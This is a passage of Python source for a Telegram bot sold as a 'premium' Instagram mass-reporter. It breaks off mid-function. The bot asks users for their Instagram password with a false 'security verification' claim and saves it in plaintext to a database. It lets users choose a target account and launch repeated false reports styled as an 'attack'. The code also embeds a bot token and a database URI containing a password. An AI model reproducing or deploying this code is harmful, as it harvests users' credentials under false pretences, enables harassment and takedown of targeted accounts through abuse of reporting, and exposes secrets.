import os
import re
import random
import asyncio
import time
import http.server
import socketserver
from threading import Thread
from pymongo import MongoClient
from datetime import datetime, timedelta
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from telegram.error import Conflict
from telegram.ext import (
    ApplicationBuilder,
    CallbackContext,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters
)

# Constants
ADMIN_ID = 6881713177  # Your admin ID
BOT_TOKEN = os.getenv("BOT_TOKEN", "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://instaboost_user:uX1YzKjiOETNhyYj@cluster0.tolxjiz.mongodb.net/instaboost?retryWrites=true&w=majority&appName=Cluster0")
PORT = int(os.environ.get('PORT', 8000))  # Render requires port binding

# States
START, LANGUAGE, REGISTER, IG_LOGIN, IG_USERNAME, IG_PASSWORD, MAIN_MENU, REPORT_MENU, \
TARGET_USERNAME, REPORT_TYPE, IMPERSONATION_URL, REPORT_LOOP, ADMIN_PANEL, BROADCAST_MESSAGE, \
SETTINGS_MENU, HELP_MENU = range(16)

# Enhanced Strings with premium features
STRINGS = {
    'en': {
        'welcome': "ЁЯФе <b>PREMIUM IG REPORTER V2.0</b> ЁЯФе\n\nЁЯОп <b>Ultimate Instagram Mass Reporter</b>\nтЪб Lightning Fast тАв ЁЯФТ 100% Anonymous тАв ЁЯТп Guaranteed Results\n\nЁЯЪА <i>Join thousands of satisfied users!</i>\n\nЁЯФР <b>SECURITY REQUIRED:</b> Login with your Instagram credentials to verify your identity.",
        'choose_lang': "ЁЯМР Please choose your language:",
        'register': "ЁЯУЭ <b>Registration</b>\n\nPlease enter your display name:",
        'ig_login_required': "ЁЯФР <b>Instagram Login Required</b>\n\nFor security and data verification, you must login with Instagram credentials",
        'ig_username': "ЁЯУ▒ <b>Instagram Login</b>\n\nEnter your Instagram username:",
        'ig_password': "ЁЯФС Enter your Instagram password:",
        'login_success': "тЬЕ <b>Login Successful!</b>\n\nWelcome @{username}",
        'main_menu': "ЁЯПа <b>Main Dashboard</b>\n\nЁЯСЛ Hello, <b>{name}</b>!\nЁЯУ▒ Instagram: <b>@{ig_username}</b>\nЁЯУК Total Reports: <b>{reports}</b>\nЁЯОп Choose your action:",
        'report_menu': "тЪФя╕П <b>Report Attack Center</b>\n\nЁЯУ▒ Your Account: <b>@{ig_username}</b>\nЁЯТе Reports Available: <b>UNLIMITED</b>\nЁЯФе Success Rate: <b>98.5%</b>",
        'target_prompt': "ЁЯОп <b>Target Selection</b>\n\nEnter Instagram username to attack:\n\nтЪая╕П <b>Format:</b> @username\nтЭМ <b>No emojis allowed</b>",
        'invalid_target': "тЭМ Invalid username!\n\nтАв Must start with @\nтАв No spaces or special characters",
        'report_type': "тЪФя╕П <b>Select Weapon Type</b>\n\nChoose violation category for maximum impact:",
        'impersonation_prompt': "ЁЯФЧ <b>Impersonation Evidence</b>\n\nЁЯУО Send URL of the original account being impersonated:",
        'confirm_report': "ЁЯЪА <b>Ready to Report</b>\n\nTarget: {target}\nType: {report_type}",
        'reporting_started': "ЁЯТе <b>Mass Attack Initiated!</b>\n\nЁЯОп Target: <b>{target}</b>\nЁЯФе Status: <b>BOMBING IN PROGRESS</b>\nтЪб Reports launching every 1-3 seconds...\nЁЯУ▒ From: <b>@{ig_username}</b>",
        'report_success': "тЬЕ Report #{count} succeeded!",
        'report_failed': "тЭМ Report #{count} failed, retrying...",
        'report_stopped': "ЁЯЫС Reporting stopped!\n\nTotal reports sent: {count}",
        'admin_panel': "ЁЯСС <b>Admin Control Center</b>\n\nЁЯЫая╕П Master Administrator Dashboard\nЁЯСе Total Users: <b>{total_users}</b>\nЁЯУК Active Reports: <b>{active_reports}</b>",
        'broadcast_sent': "ЁЯУв Broadcast sent to {count} users!",
        'profile': "ЁЯСд <b>User Profile</b>\n\nЁЯУЭ Name: <b>{name}</b>\nЁЯУ▒ Instagram: <b>@{ig_username}</b>\nЁЯУЕ Member Since: <b>{date}</b>\nЁЯУК Total Reports: <b>{reports}</b>\nтЪб Status: <b>PREMIUM</b>\nЁЯФе Rank: <b>ELITE REPORTER</b>",
        'settings_menu': "тЪЩя╕П <b>Bot Settings</b>\n\nЁЯОи Customize your experience:\n\nЁЯУ▒ Your Instagram: <b>@{ig_username}</b>\nЁЯФТ Security Level: <b>MAXIMUM</b>",
        'help_menu': "тД╣я╕П <b>Help Center</b>\n\nЁЯдЭ <b>How to use:</b>\n1я╕ПтГг Login with Instagram\n2я╕ПтГг Select target\n3я╕ПтГг Choose violation\n4я╕ПтГг Launch attack\n5я╕ПтГг Monitor progress",
        'db_error': "тЪая╕П Database connection failed, please try again later"
    },
    'hi': {
        'welcome': "ЁЯФе <b>рдкреНрд░реАрдорд┐рдпрдо IG рд░рд┐рдкреЛрд░реНрдЯрд░ V2.0</b> ЁЯФе\n\nЁЯОп <b>рдЕрд▓реНрдЯреАрдореЗрдЯ рдЗрдВрд╕реНрдЯрд╛рдЧреНрд░рд╛рдо рдорд╛рд╕ рд░рд┐рдкреЛрд░реНрдЯрд░</b>\nтЪб рдмрд┐рдЬрд▓реА рддреЗрдЬрд╝ тАв ЁЯФТ 100% рдЧреБрдордирд╛рдо тАв ЁЯТп рдЧрд╛рд░рдВрдЯреАрдб рд░рд┐рдЬрд▓реНрдЯ\n\nЁЯЪА <i>рд╣рдЬрд╛рд░реЛрдВ рд╕рдВрддреБрд╖реНрдЯ рдпреВрдЬрд░реНрд╕ рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ!</i>\n\nЁЯФР <b>рд╕реБрд░рдХреНрд╖рд╛ рдЖрд╡рд╢реНрдпрдХ:</b> рдЕрдкрдиреА рдкрд╣рдЪрд╛рди рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Instagram credentials рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХрд░реЗрдВред",
        'choose_lang': "ЁЯМР рдХреГрдкрдпрд╛ рдЕрдкрдиреА рднрд╛рд╖рд╛ рдЪреБрдиреЗрдВ:",
        'register': "ЁЯУЭ <b>рд░рдЬрд┐рд╕реНрдЯреНрд░реЗрд╢рди</b>\n\nрдХреГрдкрдпрд╛ рдЕрдкрдирд╛ рдкреНрд░рджрд░реНрд╢рди рдирд╛рдо рджрд░реНрдЬ рдХрд░реЗрдВ:",
        'ig_login_required': "ЁЯФР <b>рдЗрдВрд╕реНрдЯрд╛рдЧреНрд░рд╛рдо рд▓реЙрдЧрд┐рди рдЖрд╡рд╢реНрдпрдХ</b>\n\nрд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдбреЗрдЯрд╛ рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдЕрдкрдиреЗ Instagram credentials рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред",
        'ig_username': "ЁЯУ▒ <b>Instagram рд▓реЙрдЧрд┐рди</b>\n\nрдЕрдкрдирд╛ Instagram рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рджрд░реНрдЬ рдХрд░реЗрдВ:",
        'ig_password': "ЁЯФС рдЕрдкрдирд╛ Instagram рдкрд╛рд╕рд╡рд░реНрдб рджрд░реНрдЬ рдХрд░реЗрдВ:",
        'login_success': "тЬЕ <b>рд▓реЙрдЧрд┐рди рд╕рдлрд▓!</b>\n\nрд╕реНрд╡рд╛рдЧрдд рд╣реИ @{username}",
        'main_menu': "ЁЯПа <b>рдореБрдЦреНрдп рдбреИрд╢рдмреЛрд░реНрдб</b>\n\nЁЯСЛ рдирдорд╕реНрддреЗ, <b>{name}</b>!\nЁЯУ▒ Instagram: <b>@{ig_username}</b>\nЁЯУК рдХреБрд▓ рд░рд┐рдкреЛрд░реНрдЯреНрд╕: <b>{reports}</b>\nЁЯОп рдЕрдкрдиреА рдХрд╛рд░реНрд░рд╡рд╛рдИ рдЪреБрдиреЗрдВ:",
        'report_menu': "тЪФя╕П <b>рд░рд┐рдкреЛрд░реНрдЯ рдЕрдЯреИрдХ рд╕реЗрдВрдЯрд░</b>\n\nЁЯУ▒ рдЖрдкрдХрд╛ рдЦрд╛рддрд╛: <b>@{ig_username}</b>\nЁЯТе рд░рд┐рдкреЛрд░реНрдЯреНрд╕ рдЙрдкрд▓рдмреНрдз: <b>рдЕрд╕реАрдорд┐рдд</b>\nЁЯФе рд╕рдлрд▓рддрд╛ рджрд░: <b>98.5%</b>",
        'target_prompt': "ЁЯОп <b>рдЯрд╛рд░рдЧреЗрдЯ рд╕рд┐рд▓реЗрдХреНрд╢рди</b>\n\nрдЕрдЯреИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Instagram username рджрд░реНрдЬ рдХрд░реЗрдВ:\n\nтЪая╕П <b>рдлреЙрд░реНрдореЗрдЯ:</b> @username\nтЭМ <b>рдХреЛрдИ рдЗрдореЛрдЬреА рдЕрд▓рд╛рдЙрдб рдирд╣реАрдВ</b>",
        'invalid_target': "тЭМ рдЕрдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо!\n\nтАв @ рд╕реЗ рд╢реБрд░реВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП\nтАв рдХреЛрдИ рд░рд┐рдХреНрдд рд╕реНрдерд╛рди рдпрд╛ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдг рдирд╣реАрдВ",
        'report_type': "тЪФя╕П <b>рд╣рдерд┐рдпрд╛рд░ рдХрд╛ рдкреНрд░рдХрд╛рд░ рдЪреБрдиреЗрдВ</b>\n\nрдЕрдзрд┐рдХрддрдо рдкреНрд░рднрд╛рд╡ рдХреЗ рд▓рд┐рдП рдЙрд▓реНрд▓рдВрдШрди рд╢реНрд░реЗрдгреА рдЪреБрдиреЗрдВ:",
        'impersonation_prompt': "ЁЯФЧ <b>рдирдХрд▓ рдХрд╛ рд╕рдмреВрдд</b>\n\nЁЯУО рдореВрд▓ рдЕрдХрд╛рдЙрдВрдЯ рдХрд╛ URL рднреЗрдЬреЗрдВ рдЬрд┐рд╕рдХреА рдирдХрд▓ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ:",
        'confirm_report': "ЁЯЪА <b>рд░рд┐рдкреЛрд░реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░</b>\n\nрд▓рдХреНрд╖реНрдп: {target}\nрдкреНрд░рдХрд╛рд░: {report_type}",
        'reporting_started': "ЁЯТе <b>рдорд╛рд╕ рдЕрдЯреИрдХ рд╢реБрд░реВ!</b>\n\nЁЯОп рдЯрд╛рд░рдЧреЗрдЯ: <b>{target}</b>\nЁЯФе рд╕реНрдерд┐рддрд┐: <b>рдмрдордмрд╛рд░реА рдЬрд╛рд░реА</b>\nтЪб рд╣рд░ 1-3 рд╕реЗрдХрдВрдб рдореЗрдВ рд░рд┐рдкреЛрд░реНрдЯреНрд╕...\nЁЯУ▒ рд╕реЗ: <b>@{ig_username}</b>",
        'report_success': "тЬЕ рд░рд┐рдкреЛрд░реНрдЯ #{count} рд╕рдлрд▓!",
        'report_failed': "тЭМ рд░рд┐рдкреЛрд░реНрдЯ #{count} рд╡рд┐рдлрд▓, рдкреБрдирдГ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣реЗ рд╣реИрдВ...",
        'report_stopped': "ЁЯЫС рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рдмрдВрдж рдХрд░ рджреА рдЧрдИ!\n\nрдХреБрд▓ рд░рд┐рдкреЛрд░реНрдЯ рднреЗрдЬреА рдЧрдИ: {count}",
        'admin_panel': "ЁЯСС <b>рдПрдбрдорд┐рди рдХрдВрдЯреНрд░реЛрд▓ рд╕реЗрдВрдЯрд░</b>\n\nЁЯЫая╕П рдорд╛рд╕реНрдЯрд░ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдбреИрд╢рдмреЛрд░реНрдб\nЁЯСе рдХреБрд▓ рдпреВрдЬрд░реНрд╕: <b>{total_users}</b>\nЁЯУК рд╕рдХреНрд░рд┐рдп рд░рд┐рдкреЛрд░реНрдЯреНрд╕: <b>{active_reports}</b>",
        'broadcast_sent': "ЁЯУв {count} рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рд╕рд╛рд░рдг рднреЗрдЬрд╛ рдЧрдпрд╛!",
        'profile': "ЁЯСд <b>рдпреВрдЬрд░ рдкреНрд░реЛрдлрд╛рдЗрд▓</b>\n\nЁЯУЭ рдирд╛рдо: <b>{name}</b>\nЁЯУ▒ Instagram: <b>@{ig_username}</b>\nЁЯУЕ рд╕рджрд╕реНрдп: <b>{date}</b>\nЁЯУК рдХреБрд▓ рд░рд┐рдкреЛрд░реНрдЯреНрд╕: <b>{reports}</b>\nтЪб рд╕реНрдерд┐рддрд┐: <b>рдкреНрд░реАрдорд┐рдпрдо</b>\nЁЯФе рд░реИрдВрдХ: <b>рдПрд▓реАрдЯ рд░рд┐рдкреЛрд░реНрдЯрд░</b>",
        'settings_menu': "тЪЩя╕П <b>рдмреЙрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕</b>\n\nЁЯОи рдЕрдкрдиреЗ рдмреЙрдЯ рдЕрдиреБрднрд╡ рдХреЛ рдХрд╕реНрдЯрдорд╛рдЗрдЬрд╝ рдХрд░реЗрдВ:\n\nЁЯУ▒ рдЖрдкрдХрд╛ Instagram: <b>@{ig_username}</b>\nЁЯФТ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░: <b>рдЕрдзрд┐рдХрддрдо</b>",
        'help_menu': "тД╣я╕П <b>рд╕рд╣рд╛рдпрддрд╛ рдХреЗрдВрджреНрд░</b>\n\nЁЯдЭ <b>рдЙрдкрдпреЛрдЧ рд╡рд┐рдзрд┐:</b>\n1я╕ПтГг Instagram рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░реЗрдВ\n2я╕ПтГг рдЯрд╛рд░рдЧреЗрдЯ рдЪреБрдиреЗрдВ\n3я╕ПтГг рдЙрд▓реНрд▓рдВрдШрди рдЪреБрдиреЗрдВ\n4я╕ПтГг рдЕрдЯреИрдХ рд╢реБрд░реВ рдХрд░реЗрдВ\n5я╕ПтГг рдкреНрд░рдЧрддрд┐ рдореЙрдирд┐рдЯрд░ рдХрд░реЗрдВ",
        'db_error': "тЪая╕П рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди рд╡рд┐рдлрд▓, рдХреГрдкрдпрд╛ рдмрд╛рдж рдореЗрдВ рдкреБрдирдГ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ"
    }
}

# Premium Report Types
REPORT_TYPES = {
    'hate': 'ЁЯШб Hate Speech',
    'bully': 'ЁЯСК Bullying',
    'impersonation': 'ЁЯОн Impersonation',
    'spam': 'ЁЯУз Spam',
    'nudity': 'ЁЯФЮ Nudity',
    'violence': 'тЪФя╕П Violence',
    'fake': 'ЁЯЪл Fake Account'
}

# Button Texts
BUTTON_TEXTS = {
    'en': {
        'report_attack': 'тЪФя╕П Report Attack',
        'profile': 'ЁЯСд Profile',
        'my_reports': 'ЁЯУК My Reports',
        'home': 'ЁЯПа Home',
        'admin_panel': 'ЁЯСС Admin Panel',
        'language': 'ЁЯМР Language',
        'help': 'тД╣я╕П Help',
        'settings': 'тЪЩя╕П Settings',
        'start_new_report': 'ЁЯЪА Start New Report',
        'stop_attack': 'тП╣я╕П Stop Attack'
    },
    'hi': {
        'report_attack': 'тЪФя╕П рд░рд┐рдкреЛрд░реНрдЯ рдЕрдЯреИрдХ',
        'profile': 'ЁЯСд рдкреНрд░реЛрдлрд╛рдЗрд▓',
        'my_reports': 'ЁЯУК рдореЗрд░реА рд░рд┐рдкреЛрд░реНрдЯреНрд╕',
        'home': 'ЁЯПа рд╣реЛрдо',
        'admin_panel': 'ЁЯСС рдПрдбрдорд┐рди рдкреИрдирд▓',
        'language': 'ЁЯМР рднрд╛рд╖рд╛ рдмрджрд▓реЗрдВ',
        'help': 'тД╣я╕П рд╕рд╣рд╛рдпрддрд╛',
        'settings': 'тЪЩя╕П рд╕реЗрдЯрд┐рдВрдЧреНрд╕',
        'start_new_report': 'ЁЯЪА рдирдИ рд░рд┐рдкреЛрд░реНрдЯ рд╢реБрд░реВ рдХрд░реЗрдВ',
        'stop_attack': 'тП╣я╕П рдЕрдЯреИрдХ рдмрдВрдж рдХрд░реЗрдВ'
    }
}

# HTTP Server for Render port binding
def run_http_server():
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print(f"ЁЯМР HTTP server running on port {PORT}")
        httpd.serve_forever()

# Start HTTP server in background thread if running on Render
if os.environ.get('RENDER', False):
    Thread(target=run_http_server, daemon=True).start()
    print(f"ЁЯЪА Starting HTTP server on port {PORT} for Render")

# Database functions with robust error handling
def get_db():
    try:
        client = MongoClient(
            MONGODB_URI,
            serverSelectionTimeoutMS=5000,
            connectTimeoutMS=30000,
            socketTimeoutMS=30000
        )
        client.server_info()  # Test connection
        return client.get_database()
    except Exception as e:
        print(f"тЪая╕П Database connection failed: {e}")
        return None

def save_user(user_id, data):
    db = get_db()
    if db is None:
        return False
        
    user_data = {
        'user_id': user_id,
        'username': data.get('username', ''),
        'display_name': data.get('display_name', ''),
        'ig_username': data.get('ig_username', ''),
        'ig_password': data.get('ig_password', ''),
        'language': data.get('language', 'en'),
        'reports': data.get('reports', 0),
        'created_at': datetime.now(),
        'last_active': datetime.now()
    }
    
    try:
        db.users.update_one(
            {'user_id': user_id},
            {'$set': user_data},
            upsert=True
        )
        return True
    except Exception as e:
        print(f"тЪая╕П Failed to save user: {e}")
        return False

def get_user(user_id):
    db = get_db()
    if db is None:
        return None
    try:
        return db.users.find_one({'user_id': user_id})
    except Exception as e:
        print(f"тЪая╕П Failed to get user: {e}")
        return None

def increment_reports(user_id):
    db = get_db()
    if db is None:
        return
    try:
        db.users.update_one(
            {'user_id': user_id},
            {'$inc': {'reports': 1}}
        )
    except Exception as e:
        print(f"тЪая╕П Failed to increment reports: {e}")

def log_report(user_id, target, report_type, status):
    db = get_db()
    if db is None:
        return
    try:
        db.reports.insert_one({
            'user_id': user_id,
            'target': target,
            'report_type': report_type,
            'status': status,
            'created_at': datetime.now()
        })
    except Exception as e:
        print(f"тЪая╕П Failed to log report: {e}")

def get_all_users():
    db = get_db()
    if db is None:
        return []
    try:
        return list(db.users.find())
    except Exception as e:
        print(f"тЪая╕П Failed to get users: {e}")
        return []

# Validation functions
def is_valid_username(username):
    if not username.startswith('@'):
        return False
    clean = username[1:].strip()
    return bool(re.match(r'^[a-zA-Z0-9._]{1,30}$', clean))

# Keyboard helpers with premium styling
def get_lang_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("ЁЯЗ║ЁЯЗ╕ English", callback_data='lang_en')],
        [InlineKeyboardButton("ЁЯЗоЁЯЗ│ Hindi", callback_data='lang_hi')]
    ])

def get_main_keyboard(lang, is_admin=False):
    buttons = BUTTON_TEXTS[lang]
    keyboard = [
        [KeyboardButton(buttons['report_attack']), KeyboardButton(buttons['profile'])],
        [KeyboardButton(buttons['my_reports']), KeyboardButton(buttons['settings'])],
        [KeyboardButton(buttons['help']), KeyboardButton(buttons['home'])]
    ]
    if is_admin:
        keyboard.append([KeyboardButton(buttons['admin_panel'])])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_report_types_keyboard():
    keyboard = []
    for key, value in REPORT_TYPES.items():
        keyboard.append([InlineKeyboardButton(value, callback_data=f'type_{key}')])
    return InlineKeyboardMarkup(keyboard)

def get_report_control_keyboard(lang):
    buttons = BUTTON_TEXTS[lang]
    return ReplyKeyboardMarkup([
        [KeyboardButton(buttons['stop_attack'])],
        [KeyboardButton(buttons['home'])]
    ], resize_keyboard=True)

def get_admin_keyboard(lang):
    buttons = BUTTON_TEXTS[lang]
    return ReplyKeyboardMarkup([
        [KeyboardButton("ЁЯУв Broadcast"), KeyboardButton("ЁЯСе Users")],
        [KeyboardButton("ЁЯУК Statistics"), KeyboardButton("тЪЩя╕П Settings")],
        [KeyboardButton("тмЕя╕П Back"), KeyboardButton(buttons['home'])]
    ], resize_keyboard=True)

def get_settings_keyboard(lang):
    buttons = BUTTON_TEXTS[lang]
    return ReplyKeyboardMarkup([
        [KeyboardButton(buttons['language']), KeyboardButton("ЁЯФФ Notifications")],
        [KeyboardButton("ЁЯФТ Security"), KeyboardButton("ЁЯУ▒ Account")],
        [KeyboardButton("тмЕя╕П Back"), KeyboardButton(buttons['home'])]
    ], resize_keyboard=True)

def get_help_keyboard(lang):
    buttons = BUTTON_TEXTS[lang]
    return ReplyKeyboardMarkup([
        [KeyboardButton("ЁЯТм Contact Support"), KeyboardButton("тЭУ FAQ")],
        [KeyboardButton("ЁЯОУ Tutorial"), KeyboardButton("ЁЯУК Stats")],
        [KeyboardButton("тмЕя╕П Back"), KeyboardButton(buttons['home'])]
    ], resize_keyboard=True)

# Handlers with premium features
async def start(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        
        # Prevent conflict during restarts
        if os.environ.get('RENDER'):
            await asyncio.sleep(random.uniform(1, 3))
        
        # Check if user exists
        user = get_user(user_id)
        if user:
            lang = user.get('language', 'en')
            await update.message.reply_text(
                STRINGS[lang]['main_menu'].format(
                    name=user.get('display_name', 'User'),
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
                parse_mode='HTML'
            )
            return MAIN_MENU
        
        await update.message.reply_text(
            STRINGS['en']['welcome'],
            reply_markup=get_lang_keyboard(),
            parse_mode='HTML'
        )
        return LANGUAGE
    except Exception as e:
        print(f"тЪая╕П Error in start handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(
            STRINGS[lang]['db_error'],
            parse_mode='HTML'
        )
        return ConversationHandler.END

async def set_language(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        lang = query.data.split('_')[1]
        context.user_data['language'] = lang
        
        await query.edit_message_text(STRINGS[lang]['register'], parse_mode='HTML')
        return REGISTER
    except Exception as e:
        print(f"тЪая╕П Error in set_language handler: {e}")
        await query.edit_message_text("тЭМ An error occurred, please try again")
        return ConversationHandler.END

async def register(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        display_name = update.message.text.strip()
        lang = context.user_data.get('language', 'en')
        
        if len(display_name) < 2:
            await update.message.reply_text("тЭМ Name too short! Please enter at least 2 characters")
            return REGISTER
        
        context.user_data['display_name'] = display_name
        if not save_user(user_id, {
            'display_name': display_name,
            'language': lang
        }):
            await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
            return ConversationHandler.END
        
        await update.message.reply_text(STRINGS[lang]['ig_username'], parse_mode='HTML')
        return IG_USERNAME
    except Exception as e:
        print(f"тЪая╕П Error in register handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
        return ConversationHandler.END

async def get_ig_username(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        username = update.message.text.strip()
        lang = context.user_data.get('language', 'en')
        
        if not username:
            await update.message.reply_text("тЭМ Please enter a valid Instagram username")
            return IG_USERNAME
        
        context.user_data['ig_username'] = username
        await update.message.reply_text(STRINGS[lang]['ig_password'], parse_mode='HTML')
        return IG_PASSWORD
    except Exception as e:
        print(f"тЪая╕П Error in get_ig_username handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
        return ConversationHandler.END

async def get_ig_password(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        password = update.message.text.strip()
        lang = context.user_data.get('language', 'en')
        ig_username = context.user_data.get('ig_username', '')
        
        if not password:
            await update.message.reply_text("тЭМ Please enter your password")
            return IG_PASSWORD
        
        # Save user with Instagram credentials
        if not save_user(user_id, {
            'ig_username': ig_username,
            'ig_password': password,
            'language': lang
        }):
            await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
            return ConversationHandler.END
        
        await update.message.reply_text(
            STRINGS[lang]['login_success'].format(username=ig_username),
            reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
            parse_mode='HTML'
        )
        return MAIN_MENU
    except Exception as e:
        print(f"тЪая╕П Error in get_ig_password handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
        return ConversationHandler.END

async def main_menu(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        text = update.message.text
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        buttons = BUTTON_TEXTS[lang]
        
        if text == buttons['report_attack']:
            await update.message.reply_text(
                STRINGS[lang]['report_menu'].format(ig_username=user.get('ig_username', '')),
                reply_markup=ReplyKeyboardMarkup([[KeyboardButton(buttons['start_new_report']), KeyboardButton(buttons['home'])]], resize_keyboard=True),
                parse_mode='HTML'
            )
            return REPORT_MENU
        
        elif text == buttons['profile']:
            if user:
                join_date = user.get('created_at', datetime.now()).strftime('%Y-%m-%d')
                await update.message.reply_text(
                    STRINGS[lang]['profile'].format(
                        name=user.get('display_name', 'User'),
                        ig_username=user.get('ig_username', ''),
                        date=join_date,
                        reports=user.get('reports', 0)
                    ),
                    parse_mode='HTML'
                )
            else:
                await update.message.reply_text("тЭМ User data not found")
        
        elif text == buttons['admin_panel'] and user_id == str(ADMIN_ID):
            return await admin_panel(update, context)
        
        elif text == buttons['settings']:
            await update.message.reply_text(
                STRINGS[lang]['settings_menu'].format(ig_username=user.get('ig_username', '')),
                reply_markup=get_settings_keyboard(lang),
                parse_mode='HTML'
            )
            return SETTINGS_MENU
        
        elif text == buttons['help']:
            await update.message.reply_text(
                STRINGS[lang]['help_menu'],
                reply_markup=get_help_keyboard(lang),
                parse_mode='HTML'
            )
            return HELP_MENU
        
        return MAIN_MENU
    except Exception as e:
        print(f"тЪая╕П Error in main_menu handler: {e}")
        return MAIN_MENU

async def report_menu(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        text = update.message.text
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        buttons = BUTTON_TEXTS[lang]
        
        if text == buttons['start_new_report']:
            await update.message.reply_text(
                STRINGS[lang]['target_prompt'],
                parse_mode='HTML'
            )
            return TARGET_USERNAME
        
        elif text == buttons['home']:
            name = user.get('display_name', 'User')
            reports = user.get('reports', 0)
            ig_username = user.get('ig_username', 'Unknown')
            is_admin_user = (user_id == str(ADMIN_ID))
            
            await update.message.reply_text(
                STRINGS[lang]['main_menu'].format(
                    name=name,
                    ig_username=ig_username,
                    reports=reports
                ),
                reply_markup=get_main_keyboard(lang, is_admin_user),
                parse_mode='HTML'
            )
            return MAIN_MENU
        
        return REPORT_MENU
    except Exception as e:
        print(f"тЪая╕П Error in report_menu handler: {e}")
        return MAIN_MENU

async def get_target(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        target = update.message.text.strip()
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        
        if not is_valid_username(target):
            await update.message.reply_text(
                STRINGS[lang]['invalid_target'],
                parse_mode='HTML'
            )
            return TARGET_USERNAME
        
        context.user_data['target'] = target
        await update.message.reply_text(
            STRINGS[lang]['report_type'],
            reply_markup=get_report_types_keyboard(),
            parse_mode='HTML'
        )
        return REPORT_TYPE
    except Exception as e:
        print(f"тЪая╕П Error in get_target handler: {e}")
        return MAIN_MENU

async def set_report_type(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        report_type = query.data.split('_')[1]
        context.user_data['report_type'] = report_type
        user_id = str(query.from_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        target = context.user_data['target']
        
        if report_type == 'impersonation':
            await query.edit_message_text(
                STRINGS[lang]['impersonation_prompt'],
                parse_mode='HTML'
            )
            return IMPERSONATION_URL
        else:
            await query.edit_message_text(
                STRINGS[lang]['confirm_report'].format(
                    target=target,
                    report_type=REPORT_TYPES[report_type]
                ),
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("ЁЯЪА START REPORTING", callback_data='start_report')],
                    [InlineKeyboardButton("тЭМ CANCEL", callback_data='cancel_report')]
                ]),
                parse_mode='HTML'
            )
            return REPORT_LOOP
    except Exception as e:
        print(f"тЪая╕П Error in set_report_type handler: {e}")
        return MAIN_MENU

async def handle_impersonation_url(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        target = context.user_data['target']
        report_type = context.user_data['report_type']
        
        context.user_data['impersonation_url'] = update.message.text
        
        await update.message.reply_text(
            STRINGS[lang]['confirm_report'].format(
                target=target,
                report_type=REPORT_TYPES[report_type]
            ),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("ЁЯЪА START REPORTING", callback_data='start_report')],
                [InlineKeyboardButton("тЭМ CANCEL", callback_data='cancel_report')]
            ]),
            parse_mode='HTML'
        )
        return REPORT_LOOP
    except Exception as e:
